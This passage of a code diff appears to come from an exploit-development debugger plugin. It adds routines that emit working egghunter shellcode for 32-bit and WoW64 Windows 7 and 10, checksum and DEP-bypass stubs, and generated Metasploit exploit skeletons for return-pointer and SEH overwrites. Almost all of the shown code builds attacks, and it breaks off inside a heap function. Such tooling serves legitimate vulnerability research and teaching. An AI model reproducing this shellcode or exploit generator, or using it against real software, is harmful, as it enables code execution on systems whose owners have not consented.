+			#let's start		
+			egghunter = ""
+
+			if not usewow64:
+				#Basic version of egghunter
+				dbg.log("[+] Generating traditional 32bit egghunter code")
+				egghunter = ""
+				egghunter += (
+					"\x66\x81\xca\xff\x0f"+	#or dx,0xfff
+					"\x42"+					#INC EDX
+					"\x52"					#push edx
+					"\x6a\x02"				#push 2	(NtAccessCheckAndAuditAlarm syscall)
+					"\x58"					#pop eax
+					"\xcd\x2e"				#int 0x2e 
+					"\x3c\x05"				#cmp al,5
+					"\x5a"					#pop edx
+					"\x74\xef"				#je "or dx,0xfff"
+					"\xb8"+egg+				#mov eax, egg
+					"\x8b\xfa"				#mov edi,edx
+					"\xaf"					#scasd
+					"\x75\xea"				#jne "inc edx"
+					"\xaf"					#scasd
+					"\x75\xe7"				#jne "inc edx"
+				)
+				incedxoffset = 5 # The offset in the egghunter to reach the #INC EDX
+			if usewow64:
+				dbg.log("[+] Generating egghunter for wow64, Windows %s" % win_ver)
+				egghunter = ""
+				if win_ver == "7":
+					egghunter += (
+						# 64 stub needed before loop
+						"\x31\xdb"                                      #xor ebx,ebx
+						"\x53"                                          #push ebx
+						"\x53"                                          #push ebx
+						"\x53"                                          #push ebx
+						"\x53"                                          #push ebx
+						"\xb3\xc0"                                      #mov bl,0xc0
+		
+						# 64 Loop
+						"\x66\x81\xCA\xFF\x0F"                          #OR DX,0FFF
+						"\x42"                                          #INC EDX
+						"\x52"                                          #PUSH EDX
+						"\x6A\x26"                                      #PUSH 26 
+						"\x58"                                          #POP EAX
+						"\x33\xC9"                                      #XOR ECX,ECX
+						"\x8B\xD4"                                      #MOV EDX,ESP
+						"\x64\xff\x13"                                  #CALL DWORD PTR FS:[ebx]
+						"\x5e"                                          #POP ESI
+						"\x5a"                                          #POP EDX
+						"\x3C\x05"                                      #CMP AL,5
+						"\x74\xe9"                                      #JE SHORT
+						"\xB8"+egg+                                     #MOV EAX,74303077 w00t
+						"\x8B\xFA"                                      #MOV EDI,EDX
+						"\xAF"                                          #SCAS DWORD PTR ES:[EDI]
+						"\x75\xe4"                                      #JNZ "inc edx"
+						"\xAF"                                          #SCAS DWORD PTR ES:[EDI]
+						"\x75\xe1"                                      #JNZ "inc edx"
+						"")
+					incedxoffset = 13 # The offset in the egghunter to reach the #INC EDX
+				elif win_ver == "10":
+					egghunter += (
+					# _start:
+					    # "\x8c\xcb"            #MOV EBX,CS
+						# "\x80\xfb\x23"        #CMP BL,0x23
+						"\x33\xD2"              #XOR EDX,EDX
+					# invalid_page:
+						"\x66\x81\xCA\xFF\x0F"  #OR DX,0FFF
+					# valid_page:
+						"\x33\xDB"              #XOR EBX,EBX
+						"\x42"               	#INC EDX
+						"\x53"               	#PUSH EBX
+						"\x53"               	#PUSH EBX
+						"\x52"               	#PUSH EDX
+						"\x53"               	#PUSH EBX
+						"\x53"               	#PUSH EBX
+						"\x53"               	#PUSH EBX
+						"\x6A\x29"            	#PUSH 29
+						"\x58"               	#POP EAX
+						"\xB3\xC0"            	#MOV BL,0C0
+						"\x64\xFF\x13"          #CALL DWORD PTR FS:[EBX]
+						"\x83\xC4\x0c"          #ADD ESP,0xc
+						"\x5A"               	#POP EDX
+						"\x83\xc4\x08"          #ADD ESP,0x8
+						"\x3C\x05"            	#CMP AL,5
+						"\x74\xDF"            	#JE SHORT invalid_page
+						"\xB8" + egg +  		#MOV EAX,<tag>
+						"\x8B\xFA"              #MOV EDI,EDX
+						"\xAF"               	#SCAS DWORD PTR ES:[EDI]
+						"\x75\xDA"            	#JNZ SHORT valid_page
+						"\xAF"              	#SCAS DWORD PTR ES:[EDI]
+						"\x75\xD7"    			#JNZ SHORT valid_page
+						)
+					incedxoffset = 9 # The offset in the egghunter to reach the #INC EDX
+			if usechecksum:
+				dbg.log("[+] Generating checksum routine")
+				extratext = "+ checksum routine"
+				egg_size = ""
+				if len(data) < 256:
+					cmp_reg = "\x80\xf9"	#cmp cl,value
+					egg_size = hex2bin("%02x" % len(data))
+					offset1 = "\xf7"
+				elif len(data) < 65536:
+					cmp_reg = "\x66\x81\xf9"	#cmp cx,value
+					#avoid nulls
+					egg_size_normal = "%04X" % len(data)
+					while egg_size_normal[0:2] == "00" or egg_size_normal[2:4] == "00":
+						data += "\x90"
+						egg_size_normal = "%04X" % len(data)
+					egg_size = hex2bin(egg_size_normal[2:4]) + hex2bin(egg_size_normal[0:2])
+					offset1 = "\xf5"
+				else:
+					dbg.log("Cannot use checksum code with this payload size (way too big)",highlight=1)
+					return
+					
+				sum = 0
+				for byte in data:
+					sum += ord(byte)
+				sumstr= toHex(sum)
+				checksumbyte = sumstr[len(sumstr)-2:len(sumstr)]
+
+				sizeOfjnzincedx = 2 # The number of bytes needed for the the jnz "inc edx" instruction below
+				sizeOfChecksumRoutine = 15 # The number of static bytes in the checksum routine below
+				offset2 = shortJump(sizeOfjnzincedx, - (len(egghunter) - incedxoffset + sizeOfChecksumRoutine + len(cmp_reg) + len(egg_size)))
+				egghunter += (
+					"\x51"						#push ecx
+					"\x31\xc9"					#xor ecx,ecx
+					"\x31\xc0"					#xor eax,eax
+					"\x02\x04\x0f"				#add al,byte [edi+ecx]
+					"\x41"+						#inc ecx
+					cmp_reg + egg_size +    	#cmp cx/cl, value
+					"\x75" + offset1 +			#jnz "add al,byte [edi+ecx]
+					"\x3a\x04\x39" +			#cmp al,byte [edi+ecx]
+					"\x59" +					#pop ecx
+					"\x75" + offset2			#jnz "inc edx"
+				)		
+
+			#dep bypass ?
+			if depmethod != "":
+				dbg.log("[+] Generating dep bypass routine")
+			
+				if not depreg in freeregs:
+					getpointer += "mov " + freeregs[0] +"," + depreg + "#"
+					depreg = freeregs[0]
+				
+				freeregs.remove(depreg)
+				if depmethod == "copy" or depmethod == "copy_size":
+					if depdest != "":
+						if not depdest in freeregs:
+							getpointer += "mov " + freeregs[0] + "," + depdest + "#"
+							depdest = freeregs[0]
+					else:
+						getpc = "\xd9\xee"			# fldz
+						getpc += "\xd9\x74\xe4\xf4"	# fstenv [esp-0c]
+						depdest = freeregs[0]
+						getpc += hex2bin(assemble("pop "+depdest))
+					
+					freeregs.remove(depdest)
+				
+				sizereg = freeregs[0]
+				
+				if depsize == 0:
+					# set depsize to payload * 2 if we are using a file
+					depsize = len(data) * 2
+					if depmethod == "copy_size":
+						depsize = len(data)
+					
+				if depsize == 0:
+					dbg.log("** Please specify a valid -depsize when you are not using -f **",highlight=1)
+					return
+				else:
+					if depsize <= 127:
+						#simply push it to the stack
+						getsize = "\x6a" + hex2bin("\\x" + toHexByte(depsize))
+					else:
+						#can we do it with 16bit reg, no nulls ?
+						if depsize <= 65535:
+							sizeparam = toHex(depsize)[4:8]
+							getsize = hex2bin(assemble("xor "+sizereg+","+sizereg))
+							if not (sizeparam[0:2] == "00" or sizeparam[2:4] == "00"):
+								#no nulls, hooray, write to xX
+								getsize += regsx[sizereg][0]+hex2bin("\\x" + sizeparam[2:4] + "\\x" + sizeparam[0:2])
+							else:
+								# write the non null if we can
+								if len(regsx[sizereg]) > 2:
+									if not (sizeparam[0:2] == "00"):
+										# write to xH
+										getsize += regsx[sizereg][3] + hex2bin("\\x" + sizeparam[0:2])
+									if not (sizeparam[2:4] == "00"):
+										# write to xL
+										getsize += regsx[sizereg][2] + hex2bin("\\x" + sizeparam[2:4])
+								else:
+									#we have to write the full value to sizereg
+									blockcnt = 0
+									vpsize = 0
+									blocksize = depsize
+									while blocksize >= 127:
+										blocksize = blocksize / 2
+										blockcnt += 1
+									if blockcnt > 0:
+										getsize += addreg[sizereg] + hex2bin("\\x" + toHexByte(blocksize))
+										vpsize = blocksize
+										depblockcnt = 0
+										while depblockcnt < blockcnt:
+											getsize += hex2bin(assemble("add "+sizereg+","+sizereg))
+											vpsize += vpsize
+											depblockcnt += 1
+										delta = depsize - vpsize
+										if delta > 0:
+											getsize += addreg[sizereg] + hex2bin("\\x" + toHexByte(delta))
+									else:
+										getsize += addreg[sizereg] + hex2bin("\\x" + toHexByte(depsize))
+								# finally push
+							getsize += hex2bin(assemble("push "+ sizereg))
+								
+						else:
+							dbg.log("** Shellcode size (depsize) is too big",highlight=1)
+							return
+						
+				#finish it off
+				if depmethod == "virtualprotect":
+					jmppayload = "\x54\x6a\x40"
+					jmppayload += getsize
+					jmppayload += hex2bin(assemble("#push edi#push edi#push "+depreg+"#ret"))
+				elif depmethod == "copy":
+					jmppayload = hex2bin(assemble("push edi\push "+depdest+"#push "+depdest+"#push "+depreg+"#mov edi,"+depdest+"#ret"))
+				elif depmethod == "copy_size":
+					jmppayload += getsize
+					jmppayload += hex2bin(assemble("push edi#push "+depdest+"#push " + depdest + "#push "+depreg+"#mov edi,"+depdest+"#ret"))
+				
+		
+			#jmp to payload
+			egghunter += getpc
+			egghunter += jmppayload
+			
+			startat = ""
+			skip = ""
+			
+			#start at a certain reg ?
+			if startreg != "":
+				if startreg != "edx":
+					startat = hex2bin(assemble("mov edx," + startreg))
+				skip = "\xeb\x05"
+			
+			egghunter = skip + egghunter
+			#pickup pointer for DEP bypass ?
+			egghunter = hex2bin(assemble(getpointer)) + egghunter
+			
+			egghunter = startat + egghunter
+			
+			silent = oldsilent			
+			
+			#Convert binary to printable hex format
+			egghunter_hex = toniceHex(egghunter.strip().replace(" ",""),16)
+					
+			global ignoremodules
+			ignoremodules = True
+			hunterfilename="egghunter.txt"
+			objegghunterfile = MnLog(hunterfilename)
+			egghunterfile = objegghunterfile.reset()						
+
+			dbg.log("[+] Egghunter %s (%d bytes): " % (extratext,len(egghunter.strip().replace(" ",""))))
+			dbg.logLines("%s" % egghunter_hex)
+		
+			objegghunterfile.write("Egghunter " + extratext + ", tag " + egg + " : ",egghunterfile)
+			objegghunterfile.write(egghunter_hex,egghunterfile)			
+
+			if filename == "":
+				objegghunterfile.write("Put this tag in front of your shellcode : " + egg + egg,egghunterfile)
+			else:
+				dbg.log("[+] Shellcode, with tag : ")			
+				block = "\"" + egg + egg + "\"\n"
+				cnt = 0
+				flip = 1
+				thisline = "\""
+				while cnt < len(data):
+					thisline += "\\x%s" % toHexByte(ord(data[cnt]))				
+					if (flip == 32) or (cnt == len(data)-1):
+						if cnt == len(data)-1 and checksumbyte != "":
+							thisline += "\\x%s" % checksumbyte					
+						thisline += "\""
+						flip = 0
+						block += thisline 
+						block += "\n"
+						thisline = "\""
+					cnt += 1
+					flip += 1
+				dbg.logLines(block)	
+				objegghunterfile.write("\nShellcode, with tag :\n",egghunterfile)
+				objegghunterfile.write(block,egghunterfile)	
+		
+			ignoremodules = False
+					
+			return
+		
+		#----- Find MSP ------ #
+		
+		def procFindMSP(args):
+			distance = 0
+			
+			if "distance" in args:
+				try:
+					distance = int(args["distance"])
+				except:
+					distance = 0
+			if distance < 0:
+				dbg.log("** Please provide a positive number as distance",highlight=1)
+				return
+			mspresults = {}
+			mspresults = goFindMSP(distance,args)
+			return
+			
+		def procSuggest(args):
+			modulecriteria={}
+			criteria={}
+			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
+			isEIP = False
+			isSEH = False
+			isEIPUnicode = False
+			isSEHUnicode = False
+			initialoffsetSEH = 0
+			initialoffsetEIP = 0
+			shellcodesizeSEH = 0
+			shellcodesizeEIP = 0
+			nullsallowed = True
+			
+			global ignoremodules
+			global noheader
+			global ptr_to_get
+			global silent
+			global ptr_counter
+			
+			targetstr = ""
+			exploitstr = ""
+			originalauthor = ""
+			url = ""
+			
+			#are we attached to an application ?
+			if dbg.getDebuggedPid() == 0:
+				dbg.log("** You don't seem to be attached to an application ! **",highlight=1)
+				return
+
+			exploittype = ""
+			skeletonarg = ""
+			usecliargs = False
+			validstypes ={}
+			validstypes["tcpclient"] = "network client (tcp)"
+			validstypes["udpclient"] = "network client (udp)"
+			validstypes["fileformat"] = "fileformat"
+			exploittypes = [ "fileformat","network client (tcp)","network client (udp)" ]
+			if __DEBUGGERAPP__ == "WinDBG" or "t" in args:
+				if "t" in args:
+					if type(args["t"]).__name__.lower() != "bool":
+						skeltype = args["t"].lower()
+						skelparts = skeltype.split(":")
+						if skelparts[0] in validstypes:
+							exploittype = validstypes[skelparts[0]]
+							if len(skelparts) > 1:
+								skeletonarg = skelparts[1]
+							else:
+								dbg.log(" ** Please specify the skeleton type AND an argument. **")
+								return
+							usecliargs = True
+						else:
+							dbg.log(" ** Please specify a valid skeleton type and an argument. **")
+							return							
+					else:
+						dbg.log(" ** Please specify a skeletontype using -t **",highlight=1)
+						return
+				else:
+					dbg.log(" ** Please specify a skeletontype using -t **",highlight=1)
+					return
+
+			mspresults = {}
+			mspresults = goFindMSP(100,args)
+
+			#create metasploit skeleton file
+			exploitfilename="exploit.rb"
+			objexploitfile = MnLog(exploitfilename)
+
+			#ptr_to_get = 5				
+			noheader = True
+			ignoremodules = True
+			exploitfile = objexploitfile.reset()			
+			ignoremodules = False
+			noheader = False
+			
+			dbg.log(" ")
+			dbg.log("[+] Preparing payload...")
+			dbg.log(" ")			
+			dbg.updateLog()
+			#what options do we have ?
+			# 0 : pointer
+			# 1 : offset
+			# 2 : type
+			
+			if "registers" in mspresults:
+				for reg in mspresults["registers"]:
+					if reg.upper() == "EIP":
+						isEIP = True
+						eipval = mspresults["registers"][reg][0]
+						ptrx = MnPointer(eipval)
+						initialoffsetEIP = mspresults["registers"][reg][1]
+						
+			# 0 : pointer
+			# 1 : offset
+			# 2 : type
+			# 3 : size
+			if "seh" in mspresults:
+				if len(mspresults["seh"]) > 0:
+					isSEH = True
+					for seh in mspresults["seh"]:
+						if mspresults["seh"][seh][2] == "unicode":
+							isSEHUnicode = True
+						if not isSEHUnicode:
+							initialoffsetSEH = mspresults["seh"][seh][1]
+						else:
+							initialoffsetSEH = mspresults["seh"][seh][1]
+						shellcodesizeSEH = mspresults["seh"][seh][3]
+						
+			if isSEH:
+				ignoremodules = True
+				noheader = True
+				exploitfilename_seh="exploit_seh.rb"
+				objexploitfile_seh = MnLog(exploitfilename_seh)
+				exploitfile_seh = objexploitfile_seh.reset()				
+				ignoremodules = False
+				noheader = False
+
+			# start building exploit structure
+			
+			if not isEIP and not isSEH:
+				dbg.log(" ** Unable to suggest anything useful. You don't seem to control EIP or SEH ** ",highlight=1)
+				return
+
+			# ask for type of module
+			if not usecliargs:
+				dbg.log(" ** Please select a skeleton exploit type from the dropdown list **",highlight=1)
+				exploittype = dbg.comboBox("Select msf exploit skeleton to build :", exploittypes).lower().strip()
+
+			if not exploittype in exploittypes:
+				dbg.log("Boo - invalid exploit type, try again !",highlight=1)
+				return
+
+
+			portnr = 0
+			extension = ""
+			if exploittype.find("network") > -1:
+				if usecliargs:
+					portnr = skeletonarg
+				else:
+					portnr = dbg.inputBox("Remote port number : ")
+				try:
+					portnr = int(portnr)
+				except:
+					portnr = 0
+
+			if exploittype.find("fileformat") > -1:
+				if usecliargs:
+					extension = skeletonarg
+				else:
+					extension = dbg.inputBox("File extension :")
+			
+			extension = extension.replace("'","").replace('"',"").replace("\n","").replace("\r","")
+			
+			if not extension.startswith("."):
+				extension = "." + extension	
+				
+				
+			dbg.createLogWindow()
+			dbg.updateLog()
+			url = ""
+			
+			badchars = ""
+			if "badchars" in criteria:
+				badchars = criteria["badchars"]
+				
+			if "nonull" in criteria:
+				if not '\x00' in badchars:
+					badchars += '\x00'
+			
+			skeletonheader,skeletoninit,skeletoninit2 = getSkeletonHeader(exploittype,portnr,extension,url,badchars)
+			
+			regsto = ""			
+
+			if isEIP:
+				dbg.log("[+] Attempting to create payload for saved return pointer overwrite...")
+				#where can we jump to - get the register that has the largest buffer size
+				largestreg = ""
+				largestsize = 0
+				offsetreg = 0
+				regptr = 0
+				# register_to
+				# 0 : pointer
+				# 1 : offset
+				# 2 : size
+				# 3 : type
+				eipcriteria = criteria
+				modulecriteria["aslr"] = False
+				modulecriteria["rebase"] = False
+				modulecriteria["os"] = False
+				jmp_pointers = {}
+				jmppointer = 0
+				instrinfo = ""
+
+				if isEIPUnicode:
+					eipcriteria["unicode"] = True
+					eipcriteria["nonull"] = False
+					
+				if "registers_to" in mspresults:
+					for reg in mspresults["registers_to"]:
+						regsto += reg+","
+						thissize = mspresults["registers_to"][reg][2]
+						thisreg = reg
+						thisoffset = mspresults["registers_to"][reg][1]
+						thisregptr = mspresults["registers_to"][reg][0]
+						if thisoffset < initialoffsetEIP:
+							#fix the size, which will end at offset to EIP
+							thissize = initialoffsetEIP - thisoffset
+						if thissize > largestsize:								
+							# can we find a jmp to that reg ?
+							silent = True
+							ptr_counter = 0
+							ptr_to_get = 1								
+							jmp_pointers = findJMP(modulecriteria,eipcriteria,reg.lower())
+							if len( jmp_pointers ) == 0:
+								ptr_counter = 0
+								ptr_to_get = 1								
+								modulecriteria["os"] = True
+								jmp_pointers = findJMP(modulecriteria,eipcriteria,reg.lower())
+							modulecriteria["os"] = False
+							if len( jmp_pointers ) > 0:
+								largestsize = thissize 
+								largestreg = thisreg
+								offsetreg = thisoffset
+								regptr = thisregptr
+							silent = False
+				regsto = regsto.rstrip(",")
+				
+				
+				if largestreg == "":
+					dbg.log("    Payload is referenced by at least one register (%s), but I couldn't seem to find" % regsto,highlight=1)
+					dbg.log("    a way to jump to that register",highlight=1)
+				else:
+					#build exploit
+					for ptrtype in jmp_pointers:
+						jmppointer = jmp_pointers[ptrtype][0]
+						instrinfo = ptrtype
+						break
+					ptrx = MnPointer(jmppointer)
+					modname = ptrx.belongsTo()
+					targetstr = "      'Targets'    =>\n"
+					targetstr += "        [\n"
+					targetstr += "          [ '<fill in the OS/app version here>',\n"
+					targetstr += "            {\n"
+					if not isEIPUnicode:
+						targetstr += "              'Ret'     =>  0x" + toHex(jmppointer) + ", # " + instrinfo + " - " + modname + "\n"
+						targetstr += "              'Offset'  =>  " + str(initialoffsetEIP) + "\n"
+					else:
+						origptr = toHex(jmppointer)
+						#real unicode ?
+						unicodeptr = ""
+						transforminfo = ""
+						if origptr[0] == "0" and origptr[1] == "0" and origptr[4] == "0" and origptr[5] == "0":					
+							unicodeptr = "\"\\x" + origptr[6] + origptr[7] + "\\x" + origptr[2] + origptr[3] + "\""
+						else:
+							#transform
+							transform = UnicodeTransformInfo(origptr)
+							transformparts = transform.split(",")
+							transformsubparts = transformparts[0].split(" ")
+							origptr = transformsubparts[len(transformsubparts)-1]
+							transforminfo = " #unicode transformed to 0x" + toHex(jmppointer)
+							unicodeptr = "\"\\x" + origptr[6] + origptr[7] + "\\x" + origptr[2] + origptr[3] + "\""
+						targetstr += "              'Ret'     =>  " + unicodeptr + "," + transforminfo + "# " + instrinfo + " - " + modname + "\n"
+						targetstr += "              'Offset'  =>  " + str(initialoffsetEIP) + "  #Unicode\n"	
+					
+					targetstr += "            }\n"
+					targetstr += "          ],\n"
+					targetstr += "        ],\n"
+
+					exploitstr = "  def exploit\n\n"
+					if exploittype.find("network") > -1:
+						if exploittype.find("tcp") > -1:
+							exploitstr += "\n    connect\n\n"
+						elif exploittype.find("udp") > -1:
+							exploitstr += "\n    connect_udp\n\n"
+					
+					if initialoffsetEIP < offsetreg:
+						# eip is before shellcode
+						exploitstr += "    buffer =  rand_text(target['Offset'])  \n"
+						if not isEIPUnicode:
+							exploitstr += "    buffer << [target.ret].pack('V')  \n"
+						else:
+							exploitstr += "    buffer << target['Ret']  #Unicode friendly jump\n\n"
+						if offsetreg > initialoffsetEIP+2:
+							if not isEIPUnicode:
+								if (offsetreg - initialoffsetEIP - 4) > 0:
+									exploitstr += "    buffer << rand_text(" + str(offsetreg - initialoffsetEIP - 4) + ")  #junk\n"
+							else:
+								if ((offsetreg - initialoffsetEIP - 4)/2) > 0:
+									exploitstr += "    buffer << rand_text(" + str((offsetreg - initialoffsetEIP - 4)/2) + ")  #unicode junk\n"
+						stackadjust = 0
+						if largestreg.upper() == "ESP":
+							if not isEIPUnicode:
+								exploitstr += "    buffer << Metasm::Shellcode.assemble(Metasm::Ia32.new, 'add esp,-1500').encode_string # avoid GetPC shellcode corruption\n"
+								stackadjust = 6
+								exploitstr += "    buffer << payload.encoded  #max " + str(largestsize - stackadjust) + " bytes\n"
+						if isEIPUnicode:
+							exploitstr += "    # Metasploit requires double encoding for unicode : Use alpha_xxxx encoder in the payload section\n"
+							exploitstr += "    # and then manually encode with unicode inside the exploit section :\n\n"
+							exploitstr += "    enc = framework.encoders.create('x86/unicode_mixed')\n\n"
+							exploitstr += "    register_to_align_to = '" + largestreg.upper() + "'\n\n"
+							if largestreg.upper() == "ESP":
+								exploitstr += "    # Note : since you are using ESP as bufferregister, make sure EBP points to a writeable address !\n"
+								exploitstr += "    # or patch the unicode decoder yourself\n"
+							exploitstr += "    enc.datastore.import_options_from_hash({ 'BufferRegister' => register_to_align_to })\n\n"
+							exploitstr += "    unicodepayload = enc.encode(payload.encoded, nil, nil, platform)\n\n"
+							exploitstr += "    buffer << unicodepayload"
+								
+					else:
+						# EIP -> jump to location before EIP
+						beforeEIP = initialoffsetEIP - offsetreg
+						if beforeEIP > 0:
+							if offsetreg > 0:
+								exploitstr += "    buffer = rand_text(" + str(offsetreg)+")  #offset to " + largestreg+"\n"
+								exploitstr += "    buffer << payload.encoded  #max " + str(initialoffsetEIP - offsetreg) + " bytes\n"
+								exploitstr += "    buffer << rand_text(target['Offset'] - payload.encoded.length)\n"
+								exploitstr += "    buffer << [target.ret].pack('V')  \n"
+							else:
+								exploitstr += "    buffer = payload.encoded  #max " + str(initialoffsetEIP - offsetreg) + " bytes\n"
+								exploitstr += "    buffer << rand_text(target['Offset'] - payload.encoded.length)\n"
+								exploitstr += "    buffer << [target.ret].pack('V')  \n"
+
+					if exploittype.find("network") > -1:
+						exploitstr += "\n    print_status(\"Trying target #{target.name}...\")\n"
+						if exploittype.find("tcp") > -1:
+							exploitstr += "    sock.put(buffer)\n"
+							exploitstr += "\n    handler\n"
+						elif exploittype.find("udp") > -1:
+							exploitstr += "    udp_sock.put(buffer)\n"
+							exploitstr += "\n    handler(udp_sock)\n"
+					if exploittype == "fileformat":
+						exploitstr += "\n    file_create(buffer)\n\n"
+					
+					if exploittype.find("network") > -1:
+						exploitstr += "    disconnect\n\n"
+					exploitstr += "  end\n"					
+					dbg.log("Metasploit 'Targets' section :")
+					dbg.log("------------------------------")
+					dbg.logLines(targetstr.replace("  ","    "))
+					dbg.log("")
+					dbg.log("Metasploit 'exploit' function :")
+					dbg.log("--------------------------------")
+					dbg.logLines(exploitstr.replace("  ","    "))
+					
+					#write skeleton
+					objexploitfile.write(skeletonheader+"\n",exploitfile)
+					objexploitfile.write(skeletoninit+"\n",exploitfile)
+					objexploitfile.write(targetstr,exploitfile)
+					objexploitfile.write(skeletoninit2,exploitfile)		
+					objexploitfile.write(exploitstr,exploitfile)
+					objexploitfile.write("end",exploitfile)					
+					
+			
+			if isSEH:
+				dbg.log("[+] Attempting to create payload for SEH record overwrite...")
+				sehcriteria = criteria
+				modulecriteria["safeseh"] = False
+				modulecriteria["rebase"] = False
+				modulecriteria["aslr"] = False
+				modulecriteria["os"] = False
+				sehptr = 0
+				instrinfo = ""
+				if isSEHUnicode:
+					sehcriteria["unicode"] = True
+					if "nonull" in sehcriteria:
+						sehcriteria.pop("nonull")
+				modulecriteria["safeseh"] = False
+				#get SEH pointers
+				silent = True
+				ptr_counter = 0
+				ptr_to_get = 1					
+				seh_pointers = findSEH(modulecriteria,sehcriteria)
+				jmpback = False
+				silent = False
+				if not isSEHUnicode:
+					#did we find a pointer ?
+					if len(seh_pointers) == 0:
+						#did we try to avoid nulls ?
+						dbg.log("[+] No non-null pointers found, trying 'jump back' layout now...")
+						if "nonull" in sehcriteria:
+							if sehcriteria["nonull"] == True:
+								sehcriteria.pop("nonull")
+								silent = True
+								ptr_counter = 0
+								ptr_to_get = 1									
+								seh_pointers = findSEH(modulecriteria,sehcriteria)
+								silent = False
+								jmpback = True
+					if len(seh_pointers) != 0:
+						for ptrtypes in seh_pointers:
+							sehptr = seh_pointers[ptrtypes][0]
+							instrinfo = ptrtypes
+							break
+				else:
+					if len(seh_pointers) == 0:
+						sehptr = 0
+					else:
+						for ptrtypes in seh_pointers:
+							sehptr = seh_pointers[ptrtypes][0]
+							instrinfo = ptrtypes
+							break
+						
+				if sehptr != 0:
+					ptrx = MnPointer(sehptr)
+					modname = ptrx.belongsTo()
+					mixin = ""
+					if not jmpback:
+						mixin += "#Don't forget to include the SEH mixin !\n"
+						mixin += "include Msf::Exploit::Seh\n\n"
+						skeletonheader += "  include Msf::Exploit::Seh\n"
+
+					targetstr = "      'Targets'    =>\n"
+					targetstr += "        [\n"
+					targetstr += "          [ '<fill in the OS/app version here>',\n"
+					targetstr += "            {\n"
+					if not isSEHUnicode:
+						targetstr += "              'Ret'     =>  0x" + toHex(sehptr) + ", # " + instrinfo + " - " + modname + "\n"
+						targetstr += "              'Offset'  =>  " + str(initialoffsetSEH) + "\n"							
+					else:
+						origptr = toHex(sehptr)
+						#real unicode ?
+						unicodeptr = ""
+						transforminfo = ""
+						if origptr[0] == "0" and origptr[1] == "0" and origptr[4] == "0" and origptr[5] == "0":					
+							unicodeptr = "\"\\x" + origptr[6] + origptr[7] + "\\x" + origptr[2] + origptr[3] + "\""
+						else:
+							#transform
+							transform = UnicodeTransformInfo(origptr)
+							transformparts = transform.split(",")
+							transformsubparts = transformparts[0].split(" ")
+							origptr = transformsubparts[len(transformsubparts)-1]
+							transforminfo = " #unicode transformed to 0x" + toHex(sehptr)
+							unicodeptr = "\"\\x" + origptr[6] + origptr[7] + "\\x" + origptr[2] + origptr[3] + "\""
+						targetstr += "              'Ret'     =>  " + unicodeptr + "," + transforminfo + " # " + instrinfo + " - " + modname + "\n"
+						targetstr += "              'Offset'  =>  " + str(initialoffsetSEH) + "  #Unicode\n"						
+					targetstr += "            }\n"
+					targetstr += "          ],\n"
+					targetstr += "        ],\n"
+
+					exploitstr = "  def exploit\n\n"
+					if exploittype.find("network") > -1:
+						exploitstr += "\n    connect\n\n"
+					
+					if not isSEHUnicode:
+						if not jmpback:
+							exploitstr += "    buffer = rand_text(target['Offset'])  #junk\n"
+							exploitstr += "    buffer << generate_seh_record(target.ret)\n"
+							exploitstr += "    buffer << payload.encoded  #" + str(shellcodesizeSEH) +" bytes of space\n"
+							exploitstr += "    # more junk may be needed to trigger the exception\n"
+						else:
+							exploitstr += "    jmp_back = Rex::Arch::X86.jmp_short(-payload.encoded.length-5)\n\n"
+							exploitstr += "    buffer = rand_text(target['Offset'] - payload.encoded.length - jmp_back.length)  #junk\n"
+							exploitstr += "    buffer << payload.encoded\n"
+							exploitstr += "    buffer << jmp_back  #jump back to start of payload.encoded\n"
+							exploitstr += "    buffer << '\\xeb\\xf9\\x41\\x41'  #nseh, jump back to jmp_back\n"
+							exploitstr += "    buffer << [target.ret].pack('V')  #seh\n"
+					else:
+						exploitstr += "    nseh = <insert 2 bytes that will acts as nseh walkover>\n"
+						exploitstr += "    align = <insert routine to align a register to begin of payload and jump to it>\n\n"
+						exploitstr += "    padding = <insert bytes to fill space between alignment code and payload>\n\n"
+						exploitstr += "    # Metasploit requires double encoding for unicode : Use alpha_xxxx encoder in the payload section\n"
+						exploitstr += "    # and then manually encode with unicode inside the exploit section :\n\n"
+						exploitstr += "    enc = framework.encoders.create('x86/unicode_mixed')\n\n"
+						exploitstr += "    register_to_align_to = <fill in the register name you will align to>\n\n"
+						exploitstr += "    enc.datastore.import_options_from_hash({ 'BufferRegister' => register_to_align_to })\n\n"
+						exploitstr += "    unicodepayload = enc.encode(payload.encoded, nil, nil, platform)\n\n"
+						exploitstr += "    buffer = rand_text(target['Offset'])  #unicode junk\n"
+						exploitstr += "    buffer << nseh  #Unicode walkover friendly dword\n"
+						exploitstr += "    buffer << target['Ret']  #Unicode friendly p/p/r\n"
+						exploitstr += "    buffer << align\n"
+						exploitstr += "    buffer << padding\n"
+						exploitstr += "    buffer << unicodepayload\n"
+						
+					if exploittype.find("network") > -1:
+						exploitstr += "\n    print_status(\"Trying target #{target.name}...\")\n"					
+						exploitstr += "    sock.put(buffer)\n\n"
+						exploitstr += "    handler\n"
+					if exploittype == "fileformat":
+						exploitstr += "\n    file_create(buffer)\n\n"						
+					if exploittype.find("network") > -1:
+						exploitstr += "    disconnect\n\n"						
+						
+					exploitstr += "  end\n"
+					if mixin != "":
+						dbg.log("Metasploit 'include' section :")
+						dbg.log("------------------------------")
+						dbg.logLines(mixin)
+					dbg.log("Metasploit 'Targets' section :")
+					dbg.log("------------------------------")
+					dbg.logLines(targetstr.replace("  ","    "))
+					dbg.log("")
+					dbg.log("Metasploit 'exploit' function :")
+					dbg.log("--------------------------------")
+					dbg.logLines(exploitstr.replace("  ","    "))
+					
+					
+					#write skeleton
+					objexploitfile_seh.write(skeletonheader+"\n",exploitfile_seh)
+					objexploitfile_seh.write(skeletoninit+"\n",exploitfile_seh)
+					objexploitfile_seh.write(targetstr,exploitfile_seh)
+					objexploitfile_seh.write(skeletoninit2,exploitfile_seh)		
+					objexploitfile_seh.write(exploitstr,exploitfile_seh)
+					objexploitfile_seh.write("end",exploitfile_seh)					
+					
+				else:
+					dbg.log("    Unable to suggest a buffer layout because I couldn't find any good pointers",highlight=1)
+			
+			return	
+
+		#-----stacks-----#
+		def procStacks(args):
+			stacks = getStacks()
+			if len(stacks) > 0:
+				dbg.log("Stacks :")
+				dbg.log("--------")
+				for threadid in stacks:
+					dbg.log("Thread %s : Stack : 0x%s - 0x%s (size : 0x%s)" % (str(threadid),toHex(stacks[threadid][0]),toHex(stacks[threadid][1]),toHex(stacks[threadid][1]-stacks[threadid][0])))
+			else:
+				dbg.log("No threads/stacks found !",highlight=1)
+			return
+
+		#------heapstuff-----#
+			
+		def procHeap(args):
+		
+			os = dbg.getOsVersion()
+			heapkey = 0
+
+			#first, print list of heaps
+			allheaps = []
+			try:
